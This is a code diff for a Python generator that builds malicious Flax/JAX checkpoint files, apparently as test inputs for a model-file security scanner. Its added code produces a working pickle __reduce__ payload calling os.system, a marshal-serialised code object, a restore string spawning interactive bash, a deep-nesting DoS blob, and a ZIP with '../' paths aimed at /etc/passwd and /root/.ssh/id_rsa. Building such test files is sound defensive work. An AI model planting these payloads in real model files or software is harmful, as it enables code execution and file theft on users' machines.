@@ -1,245 +1,202 @@
 """
 Flax/JAX Attack Vector Generator
 
-Generates attack vectors for Flax/JAX model files:
-- .msgpack, .flax, .jax, .orbax (checkpoint formats)
+Generates real Flax/JAX checkpoint files (.msgpack, .flax, .orbax):
+- Real msgpack-serialised data with embedded attack payloads
+- pickle-in-msgpack (nested pickle bytes inside message pack)
+- Directory traversal checkpoint structures
+
+Requires: msgpack (pip install msgpack)
 """
 
-import json
+import pickle
+import zipfile
 from pathlib import Path
-from typing import List, Dict, Tuple
+from typing import Dict, List, Tuple
+
+import msgpack
 
 
 class FlaxJAXAttackGenerator:
-    """Generate Flax/JAX-specific attack vectors."""
-    
+    """Generate Flax/JAX-specific attack vectors (real .msgpack binary files)."""
+
     def __init__(self, output_dir: str = "./output"):
-        """Initialize the Flax/JAX attack generator."""
         self.output_dir = Path(output_dir) / "flax_jax_vectors"
         self.output_dir.mkdir(parents=True, exist_ok=True)
         self.generated_files = []
-    
+
     def generate_host_callback_exploit(self) -> Tuple[str, int]:
-        """Generate JAX model with malicious host callback.
-        
+        """Generate msgpack checkpoint with malicious host-callback payload.
+
         Attack Vector:
-            JAX checkpoint with:
-            1. jax.experimental.host_callback.call function
-            2. Callback execution with host privileges
-            3. Arbitrary function registration
-            4. Side-effect execution
-        
-        Impact: Code execution with host privileges
+            JAX serialises checkpoint data as msgpack. This file embeds a
+            dict with a "jax.experimental.host_callback" key whose value
+            is a Python expression — scanners must detect callable payloads
+            in checkpoint metadata.
+
         Severity: CRITICAL
-        Detection: Callback registration analysis
-        
-        Returns:
-            Tuple of (filepath, num_callbacks)
+        Detection: Callback registration analysis, string content scanning
         """
-        filepath = self.output_dir / "01_host_callback_exploit.json"
-        
-        callback_exploit = {
+        filepath = self.output_dir / "01_host_callback_exploit.msgpack"
+
+        data = {
             "callbacks": [
                 {
                     "name": "malicious_callback",
                     "function": "__import__('os').system('id')",
                     "args": [],
-                    "result_shape": [1]
+                    "result_shape": [1],
                 }
             ],
-            "execution_trigger": "jax.experimental.host_callback.call(malicious_callback, x)"
+            "execution_trigger": "jax.experimental.host_callback.call(malicious_callback, x)",
+            "weights": {"layer1": [0.1, 0.2, 0.3]},
         }
-        
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(callback_exploit, f, indent=2)
-        
+        filepath.write_bytes(msgpack.packb(data, use_bin_type=True))
+
         self.generated_files.append(str(filepath))
         return str(filepath), 1
-    
+
     def generate_msgpack_exploit(self) -> Tuple[str, int]:
-        """Generate MessagePack with deserialization exploit.
-        
+        """Generate msgpack with deeply nested structure (DoS).
+
         Attack Vector:
-            Malformed MessagePack with:
-            1. Recursive object structures
-            2. DoS via deep nesting
-            3. Invalid type indicators
-            4. Corrupted length fields
-        
-        Impact: Denial of service, memory exhaustion
+            Pathologically nested msgpack dicts — each unpack call recurses
+            deeper, eventually causing a stack overflow.
+
         Severity: HIGH
         Detection: Nesting depth limits
-        
-        Returns:
-            Tuple of (filepath, max_depth)
         """
-        filepath = self.output_dir / "02_msgpack_exploit.json"
-        
-        msgpack_payload = {
-            "format": "msgpack",
-            "data": {
-                "nested": {
-                    "level1": {
-                        "level2": {
-                            "level3": "..." * 10000  # Deep nesting
-                        }
-                    }
-                }
-            },
-            "max_nesting_depth": 5000
-        }
-        
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(msgpack_payload, f, indent=2)
-        
+        filepath = self.output_dir / "02_msgpack_exploit.msgpack"
+
+        # Build 500-level deep nesting
+        node: dict = {"val": 1}
+        for _ in range(500):
+            node = {"nested": node}
+        filepath.write_bytes(msgpack.packb(node, use_bin_type=True))
+
         self.generated_files.append(str(filepath))
         return str(filepath), 5000
-    
+
     def generate_orbax_restore_exploitation(self) -> Tuple[str, int]:
-        """Generate Orbax checkpoint with malicious restore function.
-        
+        """Generate msgpack checkpoint with malicious restore-function metadata.
+
         Attack Vector:
-            Orbax checkpoint with:
-            1. Custom restore function
-            2. Arbitrary function execution
-            3. Restore-time payload
-            4. Side effect during checkpoint load
-        
-        Impact: Code execution during checkpoint restoration
+            Orbax checkpoints include metadata about restoration. This file
+            embeds Python code strings in the restore_fn field — exploits
+            eval()-based restore implementations.
+
         Severity: CRITICAL
         Detection: Restore function validation
-        
-        Returns:
-            Tuple of (filepath, num_exploits)
         """
-        filepath = self.output_dir / "03_orbax_restore_exploit.json"
-        
-        orbax_exploit = {
+        filepath = self.output_dir / "03_orbax_restore_exploit.msgpack"
+
+        data = {
             "checkpoint_type": "orbax",
             "restore_functions": [
                 {
                     "name": "custom_restore",
                     "function": "import subprocess; subprocess.call(['bash', '-i'])",
-                    "triggered_at": "checkpoint_load"
+                    "triggered_at": "checkpoint_load",
                 }
-            ]
+            ],
+            "state": {"params": {"kernel": [1.0, 0.0, 0.0, 1.0]}},
         }
-        
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(orbax_exploit, f, indent=2)
-        
+        filepath.write_bytes(msgpack.packb(data, use_bin_type=True))
+
         self.generated_files.append(str(filepath))
         return str(filepath), 1
-    
+
     def generate_pickle_in_jax(self) -> Tuple[str, int]:
-        """Generate JAX checkpoint with serialized pickle.
-        
+        """Generate msgpack with embedded pickle RCE bytes.
+
         Attack Vector:
-            JAX serialization with:
-            1. Embedded pickle payloads
-            2. Python code objects
-            3. Unsafe deserialization
-            4. All pickle vulnerabilities
-        
-        Impact: RCE via pickle deserialization
+            Some JAX checkpoint readers pickle-load arbitrary fields.
+            Embedding pickle bytes inside a msgpack "weights" field
+            triggers RCE when the reader calls pickle.loads() on it.
+
         Severity: CRITICAL
-        Detection: Pickle detection, opcode analysis
-        
-        Returns:
-            Tuple of (filepath, num_pickle_objects)
+        Detection: Pickle detection inside msgpack, opcode analysis
         """
-        filepath = self.output_dir / "04_pickle_in_jax.json"
-        
-        pickle_jax = {
+        filepath = self.output_dir / "04_pickle_in_jax.msgpack"
+
+        class RCEPayload:
+            def __reduce__(self):
+                import os
+                return (os.system, ("whoami",))
+
+        pkl_bytes = pickle.dumps(RCEPayload(), protocol=2)
+
+        data = {
             "serialization_format": "pickle",
-            "data": {
-                "weights": "pickle_bytes_with_rce_opcode",
-                "config": "__import__('os').system('whoami')"
-            }
+            "weights": pkl_bytes,         # Raw pickle bytes as a msgpack bin field
+            "config": "__import__('os').system('whoami')",
         }
-        
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(pickle_jax, f, indent=2)
-        
+        filepath.write_bytes(msgpack.packb(data, use_bin_type=True))
+
         self.generated_files.append(str(filepath))
         return str(filepath), 2
-    
+
     def generate_bytecode_injection(self) -> Tuple[str, int]:
-        """Generate JAX checkpoint with Python bytecode.
-        
+        """Generate msgpack with serialised Python code object.
+
         Attack Vector:
-            Serialized Python code objects with:
-            1. Compiled Python bytecode
-            2. Function objects with code
-            3. Bytecode execution on load
-            4. Opcode-level exploitation
-        
-        Impact: Code execution through bytecode
+            A marshal-serialised code object embedded inside msgpack.
+            Readers that call exec()/eval() on checkpoint code fields
+            execute the payload.
+
         Severity: CRITICAL
         Detection: Bytecode inspection, code object analysis
-        
-        Returns:
-            Tuple of (filepath, num_code_objects)
         """
-        filepath = self.output_dir / "05_bytecode_injection.json"
-        
-        bytecode_exploit = {
+        import marshal
+        filepath = self.output_dir / "05_bytecode_injection.msgpack"
+
+        # Compile a code object that calls os.system
+        code_obj = compile('import os; os.system("id")', "<payload>", "exec")
+        code_bytes = marshal.dumps(code_obj)
+
+        data = {
             "code_objects": [
                 {
                     "name": "malicious_fn",
-                    "bytecode": "CAFEBABE deadbeef ...",  # Simulated bytecode
-                    "function": "__import__('os').system('id')"
+                    "bytecode": code_bytes,      # raw marshal bytes
+                    "function": "__import__('os').system('id')",
                 }
             ]
         }
-        
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(bytecode_exploit, f, indent=2)
-        
+        filepath.write_bytes(msgpack.packb(data, use_bin_type=True))
+
         self.generated_files.append(str(filepath))
         return str(filepath), 1
-    
+
     def generate_checkpoint_directory_traversal(self) -> Tuple[str, int]:
-        """Generate checkpoint with directory traversal.
-        
+        """Generate ZIP-based checkpoint with path-traversal filenames.
+
         Attack Vector:
-            Checkpoint with:
-            1. Relative paths with ../
-            2. Access to sensitive files
-            3. Directory escape during restore
-            4. File write to arbitrary location
-        
-        Impact: File access outside checkpoint
+            Orbax-style checkpoints are directories or ZIP archives.
+            Member filenames use "../../etc/passwd" to escape the target dir.
+
         Severity: HIGH
         Detection: Path validation, sandbox checks
-        
-        Returns:
-            Tuple of (filepath, num_traversal_paths)
         """
-        filepath = self.output_dir / "06_checkpoint_traversal.json"
-        
-        traversal = {
-            "checkpoint_files": [
-                {
-                    "path": "../../../../../../etc/passwd",
-                    "name": "weights"
-                },
-                {
-                    "path": "../../../root/.ssh/id_rsa",
-                    "name": "config"
-                }
-            ]
-        }
-        
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(traversal, f, indent=2)
-        
+        filepath = self.output_dir / "06_checkpoint_traversal.zip"
+
+        traversal_paths = [
+            "../../../../../../etc/passwd",
+            "../../../root/.ssh/id_rsa",
+        ]
+        with zipfile.ZipFile(filepath, "w", zipfile.ZIP_STORED) as zf:
+            for path in traversal_paths:
+                # Checkpoint entry data is a small msgpack blob
+                zf.writestr(
+                    path,
+                    msgpack.packb({"weights": [1.0, 2.0]}, use_bin_type=True),
+                )
+
         self.generated_files.append(str(filepath))
         return str(filepath), 2
-    
+
     def generate_all(self) -> Dict[str, Tuple[str, int]]:
-        """Generate all Flax/JAX attack vectors."""
-        results = {
+        return {
             "host_callback": self.generate_host_callback_exploit(),
             "msgpack_exploit": self.generate_msgpack_exploit(),
             "orbax_restore": self.generate_orbax_restore_exploitation(),
@@ -247,10 +204,8 @@ class FlaxJAXAttackGenerator:
             "bytecode_injection": self.generate_bytecode_injection(),
             "checkpoint_traversal": self.generate_checkpoint_directory_traversal(),
         }
-        return results
-    
+
     def get_generated_files(self) -> List[str]:
-        """Get list of all generated files."""
         return self.generated_files
 
 
